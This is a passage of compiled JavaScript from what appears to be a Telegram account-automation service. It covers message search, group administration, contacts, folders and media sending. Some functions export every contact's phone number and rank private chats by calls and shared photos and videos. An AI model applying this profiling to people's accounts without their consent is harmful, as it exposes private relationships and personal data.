                photo: messages.filter(m => m.media && m.media.className === 'MessageMediaPhoto').length,
                video: messages.filter(m => {
                    if (!m.media || m.media.className !== 'MessageMediaDocument')
                        return false;
                    const doc = m.media.document;
                    return doc && 'mimeType' in doc && doc.mimeType?.startsWith('video/');
                }).length,
                voice: messages.filter(m => {
                    if (!m.media || m.media.className !== 'MessageMediaDocument')
                        return false;
                    const doc = m.media.document;
                    return doc && 'mimeType' in doc && doc.mimeType?.startsWith('audio/');
                }).length,
                other: messages.filter(m => m.media && !['MessageMediaPhoto', 'MessageMediaDocument'].includes(m.media.className)).length
            },
            topSenders: Object.entries(messages.reduce((acc, msg) => {
                const senderId = msg.fromId?.toString();
                if (senderId) {
                    acc[senderId] = (acc[senderId] || 0) + 1;
                }
                return acc;
            }, {}))
                .sort(([, a], [, b]) => b - a)
                .slice(0, 10)
                .map(([id, count]) => ({ id, count })),
            mostActiveHours: Object.entries(messages.reduce((acc, msg) => {
                const hour = new Date(msg.date * 1000).getHours();
                acc[hour] = (acc[hour] || 0) + 1;
                return acc;
            }, {}))
                .sort(([, a], [, b]) => b - a)
                .map(([hour, count]) => ({ hour: Number(hour), count }))
        };
        return stats;
    }
    getMediaExtension(media) {
        if (!media)
            return 'bin';
        switch (media.className) {
            case 'MessageMediaPhoto':
                return 'jpg';
            case 'MessageMediaDocument':
                const doc = media.document;
                if (!doc || !('mimeType' in doc))
                    return 'bin';
                const mime = doc.mimeType;
                if (mime?.startsWith('video/'))
                    return 'mp4';
                if (mime?.startsWith('image/'))
                    return mime.split('/')[1];
                if (mime?.startsWith('audio/'))
                    return 'ogg';
                return 'bin';
            default:
                return 'bin';
        }
    }
    getSearchFilter(filter) {
        switch (filter) {
            case 'photo': return new telegram_1.Api.InputMessagesFilterPhotos();
            case 'video': return new telegram_1.Api.InputMessagesFilterVideo();
            case 'document': return new telegram_1.Api.InputMessagesFilterDocument();
            case 'url': return new telegram_1.Api.InputMessagesFilterUrl();
            case 'roundVideo': return new telegram_1.Api.InputMessagesFilterRoundVideo();
            case 'phtotoVideo': return new telegram_1.Api.InputMessagesFilterPhotoVideo();
            case 'voice': return new telegram_1.Api.InputMessagesFilterVoice();
            case 'roundVoice': return new telegram_1.Api.InputMessagesFilterRoundVoice();
            case 'gif': return new telegram_1.Api.InputMessagesFilterGif();
            case 'sticker': return new telegram_1.Api.InputMessagesFilterDocument();
            case 'animation': return new telegram_1.Api.InputMessagesFilterDocument();
            case 'music': return new telegram_1.Api.InputMessagesFilterMusic();
            case 'chatPhoto': return new telegram_1.Api.InputMessagesFilterChatPhotos();
            case 'location': return new telegram_1.Api.InputMessagesFilterGeo();
            case 'contact': return new telegram_1.Api.InputMessagesFilterContacts();
            case 'chatPhoto': return new telegram_1.Api.InputMessagesFilterChatPhotos();
            case 'phoneCalls': return new telegram_1.Api.InputMessagesFilterPhoneCalls({ missed: false });
            default: return new telegram_1.Api.InputMessagesFilterEmpty();
        }
    }
    getMediaType(media) {
        if (media instanceof telegram_1.Api.MessageMediaPhoto) {
            return 'photo';
        }
        else if (media instanceof telegram_1.Api.MessageMediaDocument) {
            const document = media.document;
            if (document.attributes.some(attr => attr instanceof telegram_1.Api.DocumentAttributeVideo)) {
                return 'video';
            }
            return 'document';
        }
        return 'document';
    }
    getEntityId(entity) {
        if (entity instanceof telegram_1.Api.User)
            return entity.id.toString();
        if (entity instanceof telegram_1.Api.Channel)
            return entity.id.toString();
        if (entity instanceof telegram_1.Api.Chat)
            return entity.id.toString();
        return '';
    }
    async addGroupMembers(groupId, members) {
        if (!this.client)
            throw new Error('Client not initialized');
        const channel = await this.client.getInputEntity(groupId);
        const users = await Promise.all(members.map(member => this.client.getInputEntity(member)));
        await this.client.invoke(new telegram_1.Api.channels.InviteToChannel({
            channel: channel,
            users
        }));
    }
    async removeGroupMembers(groupId, members) {
        if (!this.client)
            throw new Error('Client not initialized');
        const channel = await this.client.getInputEntity(groupId);
        for (const member of members) {
            const user = await this.client.getInputEntity(member);
            await this.client.invoke(new telegram_1.Api.channels.EditBanned({
                channel: channel,
                participant: user,
                bannedRights: new telegram_1.Api.ChatBannedRights({
                    untilDate: 0,
                    viewMessages: true,
                    sendMessages: true,
                    sendMedia: true,
                    sendStickers: true,
                    sendGifs: true,
                    sendGames: true,
                    sendInline: true,
                    embedLinks: true
                })
            }));
        }
    }
    async promoteToAdmin(groupId, userId, permissions, rank) {
        if (!this.client)
            throw new Error('Client not initialized');
        const channel = await this.client.getInputEntity(groupId);
        const user = await this.client.getInputEntity(userId);
        await this.client.invoke(new telegram_1.Api.channels.EditAdmin({
            channel: channel,
            userId: user,
            adminRights: new telegram_1.Api.ChatAdminRights({
                changeInfo: permissions?.changeInfo ?? false,
                postMessages: permissions?.postMessages ?? false,
                editMessages: permissions?.editMessages ?? false,
                deleteMessages: permissions?.deleteMessages ?? false,
                banUsers: permissions?.banUsers ?? false,
                inviteUsers: permissions?.inviteUsers ?? true,
                pinMessages: permissions?.pinMessages ?? false,
                addAdmins: permissions?.addAdmins ?? false,
                anonymous: permissions?.anonymous ?? false,
                manageCall: permissions?.manageCall ?? false,
                other: false
            }),
            rank: rank || ''
        }));
    }
    async demoteAdmin(groupId, userId) {
        if (!this.client)
            throw new Error('Client not initialized');
        const channel = await this.client.getInputEntity(groupId);
        const user = await this.client.getInputEntity(userId);
        await this.client.invoke(new telegram_1.Api.channels.EditAdmin({
            channel: channel,
            userId: user,
            adminRights: new telegram_1.Api.ChatAdminRights({
                changeInfo: false,
                postMessages: false,
                editMessages: false,
                deleteMessages: false,
                banUsers: false,
                inviteUsers: false,
                pinMessages: false,
                addAdmins: false,
                anonymous: false,
                manageCall: false,
                other: false
            }),
            rank: ''
        }));
    }
    async unblockGroupUser(groupId, userId) {
        if (!this.client)
            throw new Error('Client not initialized');
        const channel = await this.client.getInputEntity(groupId);
        const user = await this.client.getInputEntity(userId);
        await this.client.invoke(new telegram_1.Api.channels.EditBanned({
            channel: channel,
            participant: user,
            bannedRights: new telegram_1.Api.ChatBannedRights({
                untilDate: 0,
                viewMessages: false,
                sendMessages: false,
                sendMedia: false,
                sendStickers: false,
                sendGifs: false,
                sendGames: false,
                sendInline: false,
                embedLinks: false
            })
        }));
    }
    async getGroupAdmins(groupId) {
        if (!this.client)
            throw new Error('Client not initialized');
        const result = await this.client.invoke(new telegram_1.Api.channels.GetParticipants({
            channel: await this.client.getInputEntity(groupId),
            filter: new telegram_1.Api.ChannelParticipantsAdmins(),
            offset: 0,
            limit: 100,
            hash: (0, big_integer_1.default)(0)
        }));
        if ('users' in result) {
            const participants = result.participants;
            const users = result.users;
            return participants.map(participant => {
                const adminRights = participant.adminRights;
                return {
                    userId: participant.userId.toString(),
                    rank: participant.rank || '',
                    permissions: {
                        changeInfo: adminRights.changeInfo || false,
                        postMessages: adminRights.postMessages || false,
                        editMessages: adminRights.editMessages || false,
                        deleteMessages: adminRights.deleteMessages || false,
                        banUsers: adminRights.banUsers || false,
                        inviteUsers: adminRights.inviteUsers || false,
                        pinMessages: adminRights.pinMessages || false,
                        addAdmins: adminRights.addAdmins || false,
                        anonymous: adminRights.anonymous || false,
                        manageCall: adminRights.manageCall || false
                    }
                };
            });
        }
        return [];
    }
    async getGroupBannedUsers(groupId) {
        if (!this.client)
            throw new Error('Client not initialized');
        const result = await this.client.invoke(new telegram_1.Api.channels.GetParticipants({
            channel: await this.client.getInputEntity(groupId),
            filter: new telegram_1.Api.ChannelParticipantsBanned({ q: '' }),
            offset: 0,
            limit: 100,
            hash: (0, big_integer_1.default)(0)
        }));
        if ('users' in result) {
            const participants = result.participants;
            return participants.map(participant => {
                const bannedRights = participant.bannedRights;
                return {
                    userId: participant.peer.chatId.toString(),
                    bannedRights: {
                        viewMessages: bannedRights.viewMessages || false,
                        sendMessages: bannedRights.sendMessages || false,
                        sendMedia: bannedRights.sendMedia || false,
                        sendStickers: bannedRights.sendStickers || false,
                        sendGifs: bannedRights.sendGifs || false,
                        sendGames: bannedRights.sendGames || false,
                        sendInline: bannedRights.sendInline || false,
                        embedLinks: bannedRights.embedLinks || false,
                        untilDate: bannedRights.untilDate || 0
                    }
                };
            });
        }
        return [];
    }
    async searchMessages(params) {
        if (!this.client)
            throw new Error('Client not initialized');
        const finalResult = {
            video: { messages: [], total: 0 },
            photo: { messages: [], total: 0 },
            document: { messages: [], total: 0 },
            voice: { messages: [], total: 0 },
            text: { messages: [], total: 0 },
            all: { messages: [], total: 0 },
            roundVideo: { messages: [], total: 0 },
            roundVoice: { messages: [], total: 0 },
        };
        const { chatId, query = '', types, maxId, minId, limit } = params;
        console.log("Types: ", types);
        for (const type of types) {
            const filter = this.getSearchFilter(type);
            const queryFilter = {
                limit: limit || 500,
                ...(maxId ? { maxId } : {}),
                ...(minId ? { minId } : {}),
            };
            console.log(type, queryFilter);
            const searchQuery = {
                q: query,
                filter: filter,
                ...queryFilter,
                hash: (0, big_integer_1.default)(0),
            };
            let messages = [];
            let count = 0;
            console.log("Search Query: ", searchQuery);
            if (chatId) {
                searchQuery['peer'] = await this.safeGetEntity(chatId);
                console.log("Performing search in chat: ", chatId);
                const result = await this.client.invoke(new telegram_1.Api.messages.Search(searchQuery));
                if (!('messages' in result)) {
                    return {};
                }
                console.log(type, result?.messages?.length, result["count"]);
                count = result["count"] || 0;
                messages = result.messages;
            }
            else {
                console.log("Performing global search");
                const result = await this.client.invoke(new telegram_1.Api.messages.SearchGlobal({
                    ...searchQuery,
                    offsetRate: 0,
                    offsetPeer: new telegram_1.Api.InputPeerEmpty(),
                    offsetId: 0,
                    usersOnly: true
                }));
                if (!('messages' in result)) {
                    return {};
                }
                console.log(type, result?.messages?.length, result["count"]);
                count = result["count"] || 0;
                messages = result.messages;
            }
            if (types.includes(message_search_dto_1.MessageMediaType.TEXT) && types.length === 1) {
                console.log("Text Filter");
                messages = messages.filter((msg) => !('media' in msg));
            }
            const processedMessages = await Promise.all(messages.map(async (message) => {
                const unwantedTexts = [
                    'movie', 'series', 'tv show', 'anime', 'x264', 'aac', '720p', '1080p', 'dvd',
                    'paidgirl', 'join', 'game', 'free', 'download', 'torrent', 'link', 'invite',
                    'invite link', 'invitation', 'invitation link', 'customers', 'confirmation', 'earn', 'book', 'paper', 'pay',
                    'qr', 'invest', 'tera', 'disk', 'insta', 'mkv', 'sub', '480p', 'hevc', 'x265', 'bluray',
                    'mdisk', 'diskwala', 'tera', 'online', 'watch', 'click', 'episode', 'season', 'part', 'action',
                    'adventure', 'comedy', 'drama', 'fantasy', 'horror', 'mystery', 'romance', 'sci-fi', 'thriller',
                    'demo', 'dress', 'netlify', 'service', 'follow', 'like', 'comment', 'share', 'subscribe',
                    'premium', 'premium', 'unlock', 'access', 'exclusive', 'limited', 'offer', 'deal',
                    'discount', 'sale', 'free trial', 'free access', 'free download', 'free gift', 'freebie',
                    'crypto', 'currency', 'coin', 'blockchain', 'wallet', 'exchange', 'trading', 'investment',
                ];
                if (message.media && message.media instanceof telegram_1.Api.MessageMediaDocument) {
                    const document = message.media.document;
                    const fileNameAttr = document.attributes.find(attr => attr instanceof telegram_1.Api.DocumentAttributeFilename);
                    const fileName = fileNameAttr && fileNameAttr instanceof telegram_1.Api.DocumentAttributeFilename ? fileNameAttr.fileName : '';
                    const fileNameText = fileName.toLowerCase();
                    const isWantedFile = !(0, utils_1.contains)(fileNameText, unwantedTexts);
                    return isWantedFile ? message.id : null;
                }
                else {
                    const messageText = (message.text || '').toLowerCase();
                    const containsFilteredContent = (0, utils_1.contains)(messageText, unwantedTexts);
                    return !containsFilteredContent ? message.id : null;
                }
            }));
            const filteredMessages = processedMessages.filter(id => id !== null);
            const localResult = {
                messages: filteredMessages,
                total: count ? count : filteredMessages.length
            };
            finalResult[`${type}`] = localResult;
        }
        return finalResult;
    }
    async getAllMediaMetaData(params) {
        if (!this.client)
            throw new Error('Client not initialized');
        const { chatId, types = ['photo', 'video'], startDate, endDate, maxId, minId } = params;
        let allMedia = [];
        let hasMore = true;
        let lastOffsetId = 0;
        const limit = 200;
        while (hasMore) {
            const response = await this.getMediaMetadata({
                chatId,
                types,
                startDate,
                endDate,
                limit,
                maxId: lastOffsetId,
                minId
            });
            console.log("hasMore: ", response.hasMore, "Total: ", response.total, "lastOffsetId: ", response.lastOffsetId);
            allMedia = allMedia.concat(response.messages);
            if (!response.hasMore) {
                hasMore = false;
                console.log('No more messages to fetch');
            }
            else {
                lastOffsetId = response.lastOffsetId;
                console.log(`Fetched ${allMedia.length} messages so far`);
            }
            await (0, Helpers_1.sleep)(3000);
        }
        return {
            messages: allMedia,
            total: allMedia.length,
        };
    }
    async getFilteredMedia(params) {
        if (!this.client)
            throw new Error('Client not initialized');
        const { chatId, types = ['photo', 'video', 'document'], startDate, endDate, limit = 50, maxId, minId } = params;
        const query = {
            limit: limit || 100,
            ...(maxId ? { maxId } : {}),
            ...(minId ? { minId } : {}),
            ...(startDate && { minDate: Math.floor(startDate.getTime() / 1000) }),
            ...(endDate && { maxDate: Math.floor(endDate.getTime() / 1000) })
        };
        const ent = await this.safeGetEntity(chatId);
        console.log(query);
        const messages = await this.client.getMessages(ent, query);
        console.log(`Fetched ${messages.length} messages`);
        const filteredMessages = messages.filter(message => {
            if (!message.media)
                return false;
            const mediaType = this.getMediaType(message.media);
            return types.includes(mediaType);
        });
        console.log(`Filtered down to ${filteredMessages.length} messages`);
        const mediaData = await Promise.all(filteredMessages.map(async (message) => {
            let thumbBuffer = null;
            try {
                if (message.media instanceof telegram_1.Api.MessageMediaPhoto) {
                    const sizes = message.photo?.sizes || [1];
                    thumbBuffer = await this.downloadWithTimeout(this.client.downloadMedia(message, { thumb: sizes[1] || sizes[0] }), 5000);
                }
                else if (message.media instanceof telegram_1.Api.MessageMediaDocument) {
                    const sizes = message.document?.thumbs || [1];
                    thumbBuffer = await this.downloadWithTimeout(this.client.downloadMedia(message, { thumb: sizes[1] || sizes[0] }), 5000);
                }
            }
            catch (error) {
                console.warn(`Failed to get thumbnail for message ${message.id}:`, error.message);
            }
            const mediaDetails = await this.getMediaDetails(message.media);
            return {
                messageId: message.id,
                type: this.getMediaType(message.media),
                thumb: thumbBuffer?.toString('base64') || null,
                caption: message.message || '',
                date: message.date,
                mediaDetails,
            };
        }));
        return {
            messages: mediaData,
            total: messages.total,
            hasMore: messages.length === limit
        };
    }
    async safeGetEntity(entityId) {
        if (!this.client)
            throw new Error('Client not initialized');
        try {
            return await this.client.getEntity(entityId);
        }
        catch (error) {
            console.log(`Failed to get entity directly for ${entityId}, searching in dialogs...`);
            try {
                const dialogs = await this.client.getDialogs({
                    limit: 300
                });
                for (const dialog of dialogs) {
                    const entity = dialog.entity;
                    if (entity.id.toString() === entityId.toString()) {
                        return entity;
                    }
                }
                console.log(`Entity ${entityId} not found in dialogs either`);
                return null;
            }
            catch (dialogError) {
                console.error('Error while searching dialogs:', dialogError);
                return null;
            }
        }
    }
    generateCSV(contacts) {
        const header = ['First Name', 'Last Name', 'Phone', 'Blocked'].join(',');
        const rows = contacts.map(contact => [
            contact.firstName,
            contact.lastName,
            contact.phone,
            contact.blocked
        ].join(','));
        return [header, ...rows].join('\n');
    }
    generateVCard(contacts) {
        return contacts.map(contact => {
            const vcard = [
                'BEGIN:VCARD',
                'VERSION:3.0',
                `FN:${contact.firstName} ${contact.lastName || ''}`.trim(),
                `TEL;TYPE=CELL:${contact.phone || ''}`,
                'END:VCARD'
            ];
            return vcard.join('\n');
        }).join('\n\n');
    }
    async exportContacts(format, includeBlocked = false) {
        if (!this.client)
            throw new Error('Client not initialized');
        const contactsResult = await this.client.invoke(new telegram_1.Api.contacts.GetContacts({}));
        const contacts = contactsResult?.contacts || [];
        let blockedContacts;
        if (includeBlocked) {
            blockedContacts = await this.client.invoke(new telegram_1.Api.contacts.GetBlocked({
                offset: 0,
                limit: 100
            }));
        }
        if (format === 'csv') {
            const csvData = contacts.map((contact) => ({
                firstName: contact.firstName || '',
                lastName: contact.lastName || '',
                phone: contact.phone || '',
                blocked: blockedContacts ? blockedContacts.peers.some((p) => p.id.toString() === contact.id.toString()) : false
            }));
            return this.generateCSV(csvData);
        }
        else {
            return this.generateVCard(contacts);
        }
    }
    async importContacts(data) {
        if (!this.client)
            throw new Error('Client not initialized');
        const results = await Promise.all(data.map(async (contact) => {
            try {
                await this.client.invoke(new telegram_1.Api.contacts.ImportContacts({
                    contacts: [new telegram_1.Api.InputPhoneContact({
                            clientId: (0, big_integer_1.default)(Math.floor(Math.random() * 1000000)),
                            phone: contact.phone,
                            firstName: contact.firstName,
                            lastName: contact.lastName || ''
                        })]
                }));
                return { success: true, phone: contact.phone };
            }
            catch (error) {
                return { success: false, phone: contact.phone, error: error.message };
            }
        }));
        return results;
    }
    async manageBlockList(userIds, block) {
        if (!this.client)
            throw new Error('Client not initialized');
        const results = await Promise.all(userIds.map(async (userId) => {
            try {
                if (block) {
                    await this.client.invoke(new telegram_1.Api.contacts.Block({
                        id: await this.client.getInputEntity(userId)
                    }));
                }
                else {
                    await this.client.invoke(new telegram_1.Api.contacts.Unblock({
                        id: await this.client.getInputEntity(userId)
                    }));
                }
                return { success: true, userId };
            }
            catch (error) {
                return { success: false, userId, error: error.message };
            }
        }));
        return results;
    }
    async getContactStatistics() {
        if (!this.client)
            throw new Error('Client not initialized');
        const contactsResult = await this.client.invoke(new telegram_1.Api.contacts.GetContacts({}));
        const contacts = contactsResult?.contacts || [];
        const onlineContacts = contacts.filter((c) => c.status && 'wasOnline' in c.status);
        return {
            total: contacts.length,
            online: onlineContacts.length,
            withPhone: contacts.filter((c) => c.phone).length,
            mutual: contacts.filter((c) => c.mutual).length,
            lastWeekActive: onlineContacts.filter((c) => {
                const lastSeen = new Date(c.status.wasOnline * 1000);
                const weekAgo = new Date();
                weekAgo.setDate(weekAgo.getDate() - 7);
                return lastSeen > weekAgo;
            }).length
        };
    }
    async createChatFolder(options) {
        if (!this.client)
            throw new Error('Client not initialized');
        const folder = new telegram_1.Api.DialogFilter({
            id: Math.floor(Math.random() * 1000),
            title: new telegram_1.Api.TextWithEntities({
                text: options.name,
                entities: []
            }),
            includePeers: await Promise.all(options.includedChats.map(id => this.client.getInputEntity(id))),
            excludePeers: await Promise.all((options.excludedChats || []).map(id => this.client.getInputEntity(id))),
            pinnedPeers: [],
            contacts: options.includeContacts ?? true,
            nonContacts: options.includeNonContacts ?? true,
            groups: options.includeGroups ?? true,
            broadcasts: options.includeBroadcasts ?? true,
            bots: options.includeBots ?? true,
            excludeMuted: options.excludeMuted ?? false,
            excludeRead: options.excludeRead ?? false,
            excludeArchived: options.excludeArchived ?? false
        });
        await this.client.invoke(new telegram_1.Api.messages.UpdateDialogFilter({
            id: folder.id,
            filter: folder
        }));
        return {
            id: folder.id,
            name: options.name,
            options: {
                includeContacts: folder.contacts,
                includeNonContacts: folder.nonContacts,
                includeGroups: folder.groups,
                includeBroadcasts: folder.broadcasts,
                includeBots: folder.bots,
                excludeMuted: folder.excludeMuted,
                excludeRead: folder.excludeRead,
                excludeArchived: folder.excludeArchived
            }
        };
    }
    async getChatFolders() {
        if (!this.client)
            throw new Error('Client not initialized');
        const filters = await this.client.invoke(new telegram_1.Api.messages.GetDialogFilters());
        return (filters.filters || []).map((filter) => ({
            id: filter.id ?? 0,
            title: filter.title ?? '',
            includedChatsCount: Array.isArray(filter.includePeers) ? filter.includePeers.length : 0,
            excludedChatsCount: Array.isArray(filter.excludePeers) ? filter.excludePeers.length : 0
        }));
    }
    async sendMediaBatch(options) {
        if (!this.client)
            throw new Error('Client not initialized');
        const mediaFiles = await Promise.all(options.media.map(async (item) => {
            const buffer = await this.downloadFileFromUrl(item.url);
            const file = new uploads_1.CustomFile(item.fileName || `media.${this.getMediaExtension(item.type)}`, buffer.length, 'media', buffer);
            const uploadedFile = await this.client.uploadFile({
                file,
                workers: 1
            });
            const inputMedia = item.type === 'photo' ?
                new telegram_1.Api.InputMediaUploadedPhoto({ file: uploadedFile }) :
                new telegram_1.Api.InputMediaUploadedDocument({
                    file: uploadedFile,
                    mimeType: this.getMimeType(item.type),
                    attributes: this.getMediaAttributes(item)
                });
            return new telegram_1.Api.InputSingleMedia({
                media: inputMedia,
                message: item.caption || '',
                entities: []
            });
        }));
        return this.client.invoke(new telegram_1.Api.messages.SendMultiMedia({
            peer: options.chatId,
            multiMedia: mediaFiles,
            silent: options.silent,
            scheduleDate: options.scheduleDate
        }));
    }
    getMimeType(type) {
        switch (type) {
            case 'photo': return 'image/jpeg';
            case 'video': return 'video/mp4';
            case 'document': return 'application/octet-stream';
            default: return 'application/octet-stream';
        }
    }
    getMediaAttributes(item) {
        const attributes = [];
        if (item.fileName) {
            attributes.push(new telegram_1.Api.DocumentAttributeFilename({
                fileName: item.fileName
            }));
        }
        if (item.type === 'video') {
            attributes.push(new telegram_1.Api.DocumentAttributeVideo({
                duration: 0,
                w: 1280,
                h: 720,
                supportsStreaming: true
            }));
        }
        return attributes;
    }
    async editMessage(options) {
        if (!this.client)
            throw new Error('Client not initialized');
        if (options.media) {
            const buffer = await this.downloadFileFromUrl(options.media.url);
            const file = new uploads_1.CustomFile(`media.${this.getMediaExtension(options.media.type)}`, buffer.length, 'media', buffer);
            const uploadedFile = await this.client.uploadFile({
                file,
                workers: 1
            });
            const inputMedia = options.media.type === 'photo' ?
                new telegram_1.Api.InputMediaUploadedPhoto({ file: uploadedFile }) :
                new telegram_1.Api.InputMediaUploadedDocument({
                    file: uploadedFile,
                    mimeType: this.getMimeType(options.media.type),
                    attributes: this.getMediaAttributes(options.media)
                });
            return this.client.invoke(new telegram_1.Api.messages.EditMessage({
                peer: options.chatId,
                id: options.messageId,
                media: inputMedia,
                message: options.text || ''
            }));
        }
        if (options.text) {
            return this.client.invoke(new telegram_1.Api.messages.EditMessage({
                peer: options.chatId,
                id: options.messageId,
                message: options.text
            }));
        }
        throw new Error('Either text or media must be provided');
    }
    async getChats(options) {
        if (!this.client)
            throw new Error('Client not initialized');
        const dialogs = await this.client.getDialogs({
            ...options,
            limit: options.limit || 100
        });
        return Promise.all(dialogs.map(async (dialog) => {
            const entity = dialog.entity;
            return {
                id: entity.id.toString(),
                title: 'title' in entity ? entity.title : null,
                username: 'username' in entity ? entity.username : null,
                type: entity instanceof telegram_1.Api.User ? 'user' :
                    entity instanceof telegram_1.Api.Chat ? 'group' :
                        entity instanceof telegram_1.Api.Channel ? 'channel' : 'unknown',
                unreadCount: dialog.unreadCount,
                lastMessage: dialog.message ? {
                    id: dialog.message.id,
                    text: dialog.message.message,
                    date: new Date(dialog.message.date * 1000)
                } : null
            };
        }));
    }
    async updateChatSettings(settings) {
        if (!this.client)
            throw new Error('Client not initialized');
        const chat = await this.client.getEntity(settings.chatId);
        const updates = [];
        if (settings.title) {
            updates.push(this.client.invoke(new telegram_1.Api.channels.EditTitle({
                channel: chat,
                title: settings.title
            })));
        }
        if (settings.about) {
            updates.push(this.client.invoke(new telegram_1.Api.messages.EditChatAbout({
                peer: chat,
                about: settings.about
            })));
        }
        if (settings.photo) {
            const buffer = await this.downloadFileFromUrl(settings.photo);
            const file = await this.client.uploadFile({
                file: new uploads_1.CustomFile('photo.jpg', buffer.length, 'photo.jpg', buffer),
                workers: 1
            });
            updates.push(this.client.invoke(new telegram_1.Api.channels.EditPhoto({
                channel: chat,
                photo: new telegram_1.Api.InputChatUploadedPhoto({
                    file: file
                })
            })));
        }
        if (settings.slowMode !== undefined) {
            updates.push(this.client.invoke(new telegram_1.Api.channels.ToggleSlowMode({
                channel: chat,
                seconds: settings.slowMode
            })));
        }
        if (settings.linkedChat) {
            const linkedChannel = await this.client.getEntity(settings.linkedChat);
            updates.push(this.client.invoke(new telegram_1.Api.channels.SetDiscussionGroup({
                broadcast: chat,
                group: linkedChannel
            })));
        }
        if (settings.username) {
            updates.push(this.client.invoke(new telegram_1.Api.channels.UpdateUsername({
                channel: chat,
                username: settings.username
            })));
        }
        await Promise.all(updates);
        return true;
    }
    async getMessageStats(options) {
        if (!this.client)
            throw new Error('Client not initialized');
        const now = options.fromDate || new Date();
        const startDate = new Date(now);
        switch (options.period) {
            case 'day':
                startDate.setDate(startDate.getDate() - 1);
                break;
            case 'week':
                startDate.setDate(startDate.getDate() - 7);
                break;
            case 'month':
                startDate.setMonth(startDate.getMonth() - 1);
                break;
        }
        const messages = await this.client.getMessages(options.chatId, {
            limit: 100,
            offsetDate: Math.floor(now.getTime() / 1000),
        });
        const stats = {
            total: messages.length,
            withMedia: 0,
            withLinks: 0,
            withForwards: 0,
            byHour: new Array(24).fill(0),
            byType: {
                text: 0,
                photo: 0,
                video: 0,
                document: 0,
                other: 0
            }
        };
        for (const msg of messages) {
            const hour = new Date(msg.date * 1000).getHours();
            stats.byHour[hour]++;
            if (msg.media) {
                stats.withMedia++;
                const mediaType = this.getMediaType(msg.media);
                stats.byType[mediaType] = (stats.byType[mediaType] || 0) + 1;
            }
            else if (msg.message) {
                if (msg.message.match(/https?:\/\/[^\s]+/)) {
                    stats.withLinks++;
                }
                stats.byType.text++;
            }
            if (msg.fwdFrom) {
                stats.withForwards++;
            }
        }
        return stats;
    }
    async getTopPrivateChats() {
        if (!this.client)
            throw new Error('Client not initialized');
        console.log('Starting getTopPrivateChats analysis...');
        const startTime = Date.now();
        const weights = {
            videoCall: 15,
            incoming: 5,
            outgoing: 1,
            sharedVideo: 6,
            sharedPhoto: 4,
            textMessage: 1,
        };
        console.log('Fetching dialogs...');
        const dialogs = await this.client.getDialogs({
            limit: 200
        });
        console.log(`Found ${dialogs.length} total dialogs`);
        const privateChats = dialogs.filter(dialog => dialog.isUser &&
            dialog.entity instanceof telegram_1.Api.User &&
            !dialog.entity.bot &&
            !dialog.entity.fake &&
            dialog.entity.id.toString() !== "777000" &&
            dialog.entity.id.toString() !== "42777");
        console.log(`Found ${privateChats.length} valid private chats after filtering`);
        const now = Math.floor(Date.now() / 1000);
        const batchSize = 10;
        const chatStats = [];
        const callLogs = await this.getCallLogsInternal();
        console.log(callLogs);
        for (let i = 0; i < privateChats.length; i += batchSize) {
            console.log(`Processing batch ${Math.floor(i / batchSize) + 1}/${Math.ceil(privateChats.length / batchSize)}`);
            const batch = privateChats.slice(i, i + batchSize);
            const batchResults = await Promise.all(batch.map(async (dialog) => {
                const processingStart = Date.now();
                const chatId = dialog.entity.id.toString();
                const user = dialog.entity;
                console.log(`Processing chat ${chatId} (${user.firstName || 'Unknown'}) last: ${dialog.message.id}`);
                try {
                    const messages = await this.client.getMessages(chatId, {
                        limit: 30,
                    });
                    if (messages.length < 20) {
                        console.log(`Skipping chat ${chatId} - insufficient messages (${messages.length}) | total: ${messages.total} `);
                        return null;
                    }
                    const messageStats = await this.searchMessages({ chatId, types: [message_search_dto_1.MessageMediaType.PHOTO, message_search_dto_1.MessageMediaType.ROUND_VIDEO, message_search_dto_1.MessageMediaType.VIDEO, message_search_dto_1.MessageMediaType.DOCUMENT, message_search_dto_1.MessageMediaType.VOICE, message_search_dto_1.MessageMediaType.ROUND_VOICE, message_search_dto_1.MessageMediaType.CHAT_PHOTO], limit: 100 });
                    console.log(`Retrieved ${messages.length} messages for chat ${chatId} | total: ${messages.total}`);
                    const callStats = {
                        total: 0,
                        incoming: 0,
                        outgoing: 0,
                        video: 0
                    };
                    const mediaStats = { photos: messageStats.photo.total, videos: messageStats?.video?.total || 0 + messageStats?.roundVideo?.total || 0 };
                    const userCalls = callLogs[chatId];
                    console.log(userCalls);
                    if (userCalls) {
                        callStats.total = userCalls.totalCalls;
                        callStats.incoming = userCalls.incoming;
                        callStats.outgoing = userCalls.outgoing;
                    }
                    const interactionScore = (callStats.incoming * weights.incoming +
                        callStats.outgoing * weights.outgoing +
                        callStats.video * weights.videoCall +
                        mediaStats.videos * weights.sharedVideo +
                        mediaStats.photos * weights.sharedPhoto +
                        messages.total * weights.textMessage);
                    const activityBreakdown = {
                        videoCalls: (callStats.video * weights.videoCall) / interactionScore * 100,
                        incoming: (callStats.incoming * weights.incoming) / interactionScore * 100,
                        outgoing: (callStats.outgoing * weights.outgoing) / interactionScore * 100,
                        mediaSharing: ((mediaStats.videos * weights.sharedVideo + mediaStats.photos * weights.sharedPhoto)) / interactionScore * 100,
                        textMessages: (messages.total * weights.textMessage) / interactionScore * 100
                    };
                    const processingTime = Date.now() - processingStart;
                    console.log(`Finished processing chat ${chatId} in ${processingTime}ms with interaction score: ${interactionScore}`);
                    return {
                        chatId,
                        username: user.username,
                        firstName: user.firstName,
                        lastName: user.lastName,
                        totalMessages: messages.total,
                        interactionScore: Math.round(interactionScore * 100) / 100,
                        calls: callStats,
                        media: mediaStats,
                        activityBreakdown
                    };
                }
                catch (error) {
                    console.error(`Error processing chat ${chatId}:`, error);
                    return null;
                }
            }));
            chatStats.push(...batchResults.filter(Boolean));
        }
        const topChats = chatStats
            .sort((a, b) => b.interactionScore - a.interactionScore)
            .slice(0, 10);
        const totalTime = Date.now() - startTime;
        console.log(`getTopPrivateChats completed in ${totalTime}ms. Found ${topChats.length} top chats`);
        topChats.forEach((chat, index) => {
            console.log(`Top ${index + 1}: ${chat.firstName} (${chat.username || 'no username'}) - Score: ${chat.interactionScore}`);
        });
        return topChats;
    }
    async createGroupOrChannel(options) {
        if (!this.client)
            throw new Error('Client not initialized');
        try {
            console.log('Creating group or channel with options:', options);
            const result = await this.client.invoke(new telegram_1.Api.channels.CreateChannel(options));
            return result;
        }
        catch (error) {
            console.error('Error creating group or channel:', error);
            throw new Error(`Failed to create group or channel: ${error.message}`);
        }
    }
    async createBot(options) {
        if (!this.client) {
            console.error('Bot creation failed: Client not initialized');
            throw new Error('Client not initialized');
        }
        const botFatherUsername = 'BotFather';
        console.log(`[BOT CREATION] Starting bot creation process for "${options.name}" (${options.username})`);
        try {
